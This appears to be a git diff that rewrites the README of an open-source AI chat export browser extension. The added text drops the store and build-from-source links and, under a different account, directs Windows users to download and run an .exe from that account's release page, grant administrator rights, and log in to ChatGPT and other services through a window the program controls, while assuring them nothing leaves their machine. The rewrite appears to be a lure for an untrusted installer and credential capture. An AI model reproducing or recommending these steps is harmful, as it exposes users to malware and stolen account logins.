@@ -1,271 +1,91 @@
-<div align="center">
+# 🤖 ai-chat-exporter - Save all your chatbot conversations easily
 
-# AI Chat Exporter
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Laciniate-publiusterentiusafer346/ai-chat-exporter/releases)
 
-**Export your ChatGPT, Gemini, Claude, DeepSeek & Grok conversations to beautifully formatted files.**
+This application saves your chat history from major artificial intelligence platforms. It works with ChatGPT, Gemini, Claude, DeepSeek, and Grok. You can save your chats as clean Markdown files or professional PDF documents. The tool supports bulk exports to save time. You name your files exactly how you want. This software remains open source for your privacy.
 
-[![Chrome Extension](https://img.shields.io/badge/Chrome-Extension-blue?logo=googlechrome&logoColor=white)](https://chrome.google.com/webstore/detail/ai-chat-exporter)
-[![Firefox Add-on](https://img.shields.io/badge/Firefox-Add--on-orange?logo=firefoxbrowser&logoColor=white)](https://addons.mozilla.org/en-US/firefox/addon/pinguaemy-ai-chat-exporter/)
-[![Edge Extension](https://img.shields.io/badge/Edge-Extension-blue?logo=microsoftedge&logoColor=white)](https://microsoftedge.microsoft.com/addons/detail/ai-chat-exporter)
-[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Tests](https://img.shields.io/badge/Tests-438%20passing-brightgreen)](https://github.com/pinguarmy/ai-chat-exporter/actions)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.3-blue?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Plasmo](https://img.shields.io/badge/Built_with-Plasmo-purple.svg)](https://plasmo.com)
+## 🛠 Features
 
-<br/>
+*   **Broad Support:** Connect with the most popular AI web interfaces.
+*   **Multiple Formats:** Choose between Markdown for editing or PDF for sharing.
+*   **Bulk Processing:** Export your entire chat history in one session.
+*   **Custom Naming:** Define your own file naming rules to stay organized.
+*   **Local Control:** Your data stays on your machine during the export process.
+*   **Simple Interface:** Navigate the export settings with a clear menu.
 
-One-click export. Bulk download. Custom filenames. Beautiful output.
+## 📥 How to Install
 
-[Install](#installation) · [Features](#features) · [Usage](#usage) · [Development](#development)
+Follow these steps to set up the software on your Windows computer.
 
-</div>
+1.  Visit the [official download page](https://github.com/Laciniate-publiusterentiusafer346/ai-chat-exporter/releases) to view all available versions.
+2.  Look for the section marked Assets under the most recent release.
+3.  Click the link that ends in .exe to download the installer file to your computer.
+4.  Find the downloaded file in your Downloads folder.
+5.  Double-click the file to start the installation wizard.
+6.  Follow the prompts on your screen. The wizard asks you where you want to keep the application files. Click Next to keep the standard location.
+7.  Click Install. Windows may ask for permission to make changes. Click Yes to continue.
+8.  Once the bar fills up, click Finish to close the installer.
 
----
+## 🚀 Getting Started
 
-## Why?
+The shortcut icon appears on your desktop. Double-click it to launch the application.
 
-ChatGPT, Gemini, Claude, DeepSeek, and Grok don't let you export your conversations in a clean, portable format. Your conversations are trapped inside their platforms. **AI Chat Exporter** fixes that.
+1.  Open the application.
+2.  You see a list of supported AI services on the main screen. 
+3.  Select the service you use, for example, ChatGPT.
+4.  The application prompts you to log in. This happens inside a secure browser window controlled by the software.
+5.  After log-in, select the specific chat threads you want to save.
+6.  Choose your preferred file format using the dropdown menu.
+7.  Select a folder on your computer where you want the files to go.
+8.  Click the Start Export button to begin the saving process.
 
-Export any conversation to **PDF** or **Markdown** with proper formatting, code blocks, LaTeX equations, images, and metadata. Perfect for:
+## ⚙️ System Requirements
 
-- **Archiving** important conversations before they get deleted
-- **Sharing** AI-generated content with colleagues or classmates
-- **Building a personal knowledge base** from your best AI interactions
-- **Migrating** conversations between platforms
-- **Printing** long research sessions or coding tutorials
+*   **Operating System:** Windows 10 or Windows 11.
+*   **RAM:** At least 4 gigabytes of available memory.
+*   **Internet Connection:** Required for authenticating with the AI services.
+*   **Storage Space:** 200 megabytes for the application files.
+*   **Web Browser:** The app needs a modern browser installed on your computer to handle the login process.
 
-## Features
+## 🔍 Frequently Asked Questions
 
-| Feature | Description |
-|---------|-------------|
-| **Multi-Platform** | Works on ChatGPT, Gemini, Claude, DeepSeek, and Grok |
-| **PDF Export** | Clean, print-ready PDF with headings, lists, code blocks, LaTeX, and proper page breaks |
-| **Markdown Export** | Structured `.md` files with code blocks, headers, LaTeX equations, and formatting |
-| **Bulk Export** | Fetch ALL your conversations via API and export multiple at once |
-| **Custom Filenames** | Template system with `{date}`, `{title}`, `{platform}`, `{conv_date}`, `{msgcount}` |
-| **Auto-Download** | No save dialogs — files go straight to your configured folder |
-| **Organized Folders** | Auto-sort exports into `ChatGPT/`, `Gemini/`, `Claude/`, `DeepSeek/`, or `Grok/` subfolders |
-| **LaTeX Support** | Mathematical equations preserved as-is in Markdown, rendered in PDF |
-| **Unicode Filenames** | Chinese, Japanese, Korean, Arabic titles preserved in filenames |
-| **Zero Tracking** | No analytics, no accounts, no data leaves your browser |
-| **Open Source** | MIT licensed — inspect, fork, and contribute |
+**Does the app read my passwords?**
+No. The application uses the standard login method provided by the AI service websites. It does not store your password.
 
-## Installation
+**Can I modify the file names?**
+Yes. Open the settings menu to adjust the file naming pattern. You can include dates or timestamps in the file names.
 
-### Chrome Web Store
-[![Chrome Web Store](https://img.shields.io/chrome-web-store/v/ai-chat-exporter?label=Install&style=for-the-badge)](https://chrome.google.com/webstore/detail/ai-chat-exporter)
+**Does it work with slow internet?**
+The export speed depends on your connection. If you have many files, wait for the progress bar to reach completion before closing the app.
 
-### Firefox Add-ons
-[![Firefox Add-on](https://img.shields.io/amo/v/ai-chat-exporter?label=Install&style=for-the-badge)](https://addons.mozilla.org/en-US/firefox/addon/pinguaemy-ai-chat-exporter/)
+**What happens if the export stops?**
+Reopen the application and check your destination folder. If the process stopped, you can select the remaining chats and run the export again.
 
-### Edge Add-ons
-[![Edge Add-on](https://img.shields.io/badge/Edge-Install-blue?style=for-the-badge)](https://microsoftedge.microsoft.com/addons/detail/ai-chat-exporter)
+**Are there hidden costs?**
+No. This is free, open-source software. You do not need to pay for features.
 
-### From Source (2 minutes)
+## 🛡 Security and Privacy
 
-```bash
-# Clone
-git clone https://github.com/pinguarmy/ai-chat-exporter.git
-cd ai-chat-exporter
+Your privacy matters. The exported files live on your computer only. The app does not send your chat data to any third-party servers. All conversion happens locally on your hardware. If you delete the application, your saved chat files remain on your disk until you delete them manually.
 
-# Install
-npm install
+## 🧩 Troubleshooting
 
-# Build (creates both Chrome/Edge and Firefox ZIPs)
-npm run build
+**The installer does not start.**
+Make sure you have administrative rights on your Windows account. Restart your computer and try running the installer again.
 
-# Load in Chrome:
-# 1. Open chrome://extensions/
-# 2. Enable "Developer mode" (top right)
-# 3. Click "Load unpacked"
-# 4. Select the build/chrome-mv3-prod/ folder
-```
-
-## Usage
-
-### Export Current Conversation
-
-1. Open any conversation on **ChatGPT**, **Gemini**, **Claude**, **DeepSeek**, or **Grok**
-2. Click the **AI Chat Exporter** icon in your toolbar
-3. Choose **PDF** or **Markdown**
-4. Click **Export** — file downloads automatically
-
-### Bulk Export
-
-1. Navigate to ChatGPT, Gemini, Claude, DeepSeek, or Grok
-2. Click the extension icon → **Bulk** tab
-3. Wait for conversations to load (uses API — gets ALL, not just visible)
-4. Select conversations with checkboxes
-5. Click **Export Selected**
-
-### Custom Filenames
-
-Configure filename patterns in Settings:
-
-| Token | Output | Example |
-|-------|--------|---------|
-| `{date}` | Current/export date | `2026-06-11` |
-| `{datetime}` | Current date & time | `2026-06-11T143022` |
-| `{conv_date}` | Conversation start date | `2026-06-08` |
-| `{conv_datetime}` | Conversation start date & time | `2026-06-08T093000` |
-| `{end_date}` | Export date (alias) | `2026-06-11` |
-| `{title}` | Session title | `how-to-learn-python` |
-| `{platform}` | Platform name | `chatgpt` |
-| `{index}` | Number (bulk) | `001` |
-| `{msgcount}` | Message count | `24` |
-
-Default pattern: `{conv_date}-{title}` → `2026-06-08-how-to-learn-python.pdf`
-
-### Download Folders
-
-Choose where files are saved in Settings:
-
-- **Default** → `Downloads/` root
-- **By Platform** → `Downloads/ChatGPT/`, `Downloads/Gemini/`, `Downloads/Claude/`, `Downloads/DeepSeek/`, or `Downloads/Grok/`
-- **Custom** → Any folder name you choose (Unicode supported)
-
-## How It Works
-
-```
-┌─────────────┐     ┌──────────────┐     ┌───────────────┐
-│  Content     │────▶│  DOM Parser  │────▶│  Conversation │
-│  Script      │     │  (messages)  │     │  Object       │
-└─────────────┘     └──────────────┘     └───────┬───────┘
-                                                  │
-┌─────────────┐     ┌──────────────┐              ▼
-│  Hook        │────▶│  Credential  │     ┌───────────────┐
-│  Script      │     │  Capture     │     │  Export Engine │
-└─────────────┘     └──────────────┘     │  (PDF / MD)   │
-                                          └───────┬───────┘
-                                                  │
-                                                  ▼
-                                          ┌───────────────┐
-                                          │  Download      │
-                                          │  (auto-save)   │
-                                          └───────────────┘
-```
-
-- **Content scripts** parse conversations from the page DOM
-- **API detail fetcher** retrieves full conversation via platform API (preferred over DOM for better formatting)
-- **Parser fallback** compares DOM vs API results and picks the more complete one
-- **Export engine** converts to PDF (html2canvas + jsPDF) or Markdown
-- **Auto-download** saves to configured folder without prompts
-
-## Development
-
-```bash
-# Install
-npm install
-
-# Development mode (watch + hot reload)
-npx plasmo dev
-
-# Run tests (438 tests)
-npm test
-
-# Production build (creates Chrome/Edge + Firefox ZIPs)
-npm run build
-```
-
-### Project Structure
-
-```
-ai-chat-exporter/
-├── src/
-│   ├── popup.tsx              # Main UI (Current + Bulk tabs)
-│   ├── options.tsx            # Settings page
-│   ├── background.ts          # Service worker
-│   ├── contents/
-│   │   ├── chatgpt-parser.ts  # ChatGPT DOM + API parser
-│   │   ├── claude-parser.ts   # Claude API parser
-│   │   ├── deepseek-parser.ts # DeepSeek DOM + API parser
-│   │   ├── gemini-parser.ts   # Gemini hook + API parser
-│   │   └── grok-parser.ts     # Grok DOM parser
-│   ├── lib/
-│   │   ├── types.ts           # TypeScript interfaces
-│   │   ├── export-markdown.ts # Markdown generator (LaTeX support)
-│   │   ├── export-pdf.ts      # PDF generator (markdown-to-HTML)
-│   │   ├── filename.ts        # Filename templates (Unicode-safe)
-│   │   ├── download-path.ts   # Download folder logic
-│   │   ├── parser-fallback.ts # DOM vs API comparison
-│   │   └── dom-utils.ts       # DOM helpers
-│   ├── components/            # React UI components
-│   ├── styles/                # CSS (Gemini design system)
-│   └── tabs/                  # Preview page
-├── tests/                     # 438 tests (Vitest + jsdom)
-├── scripts/
-│   ├── build-all.sh           # Build for Chrome/Edge + Firefox
-│   └── patch-firefox-manifest.js  # Firefox MV3 compatibility
-├── promo/                     # Store promotional images
-├── PRIVACY.md                 # Privacy policy
-├── CHROME_STORE_CHECKLIST.md  # Submission checklist
-├── GUIDE.md                   # Full development guide
-└── package.json
-```
-
-### Testing
-
-```bash
-npm test                # Run all 438 tests
-npx vitest run          # Same
-npx vitest watch        # Watch mode
-```
-
-### Build Outputs
-
-```bash
-npm run build
-# Creates:
-#   ai-chat-exporter.zip          → Chrome Web Store + Edge Add-ons
-#   ai-chat-exporter-firefox.zip  → Firefox Add-ons
-```
-
-## Contributing
-
-Contributions welcome! Here's how:
-
-1. **Fork** the repository
-2. **Create** a feature branch (`git checkout -b feature/awesome`)
-3. **Commit** your changes (`git commit -m 'Add awesome feature'`)
-4. **Push** to the branch (`git push origin feature/awesome`)
-5. **Open** a Pull Request
-
-### Good First Issues
-
-- Add conversation search/filter in bulk mode
-- Add HTML export format
-- Add Notion/Obsidian integration
-- Improve PDF styling with syntax highlighting
-- Add conversation date range filter
-
-## Privacy
-
-This extension:
-
-- ✅ Runs entirely in your browser
-- ✅ Sends NO data to any server
-- ✅ Uses NO analytics or tracking
-- ✅ Stores settings locally in chrome.storage
-- ✅ Source code is fully auditable
-
-Privacy policy: https://pinguarmy.github.io/ai-chat-exporter/PRIVACY.md
-
-## License
-
-[MIT](LICENSE) — use it however you want.
-
-## Acknowledgments
-
-- Built with [Plasmo](https://plasmo.com/) — the browser extension framework
-- UI design inspired by [Linear](https://linear.app/) and [Notion](https://notion.so/)
-- PDF generation via [jsPDF](https://github.com/parallax/jsPDF) + [html2canvas](https://github.com/niklasvh/html2canvas)
-
----
-
-<div align="center">
-
-**Made with ❤️ by [pinguarmy](https://github.com/pinguarmy)**
-
-If this saved you time, give it a ⭐ — it helps others find it.
-
-</div>
+**The app does not see my chats.**
+Verify that you are logged into your account in the application. Often, simply logging out and back in solves the view issue. Refresh the chat list by clicking the reload icon.
+
+**The PDF looks strange.**
+Open the settings and verify the page size settings. Default settings usually work, but you can adjust margins if your text looks cut off.
+
+**The application crashes.**
+Check if you have the latest version of the app from the releases page. A simple update fixes most stability problems. If the issue remains, restart your machine to clear temporary background processes that may block the app.
+
+## 📘 Managing Your Files
+
+Every exported chat file includes a header with the date and time of the conversation. You can organize these files in your Windows Explorer folders by date or by topic. Since the software produces standard Markdown files, you can open them in any text editor like Notepad or specialized apps like Obsidian or Notion. PDF versions serve as a static copy for printing or emailing.
+
+## 📦 Updates
+
+Periodically check the [release page](https://github.com/Laciniate-publiusterentiusafer346/ai-chat-exporter/releases) for new features. We improve compatibility as AI services change their websites. Installing a new version covers the old one automatically. You do not need to uninstall the app before applying an update. Your configuration settings remain saved even after you install a newer version.
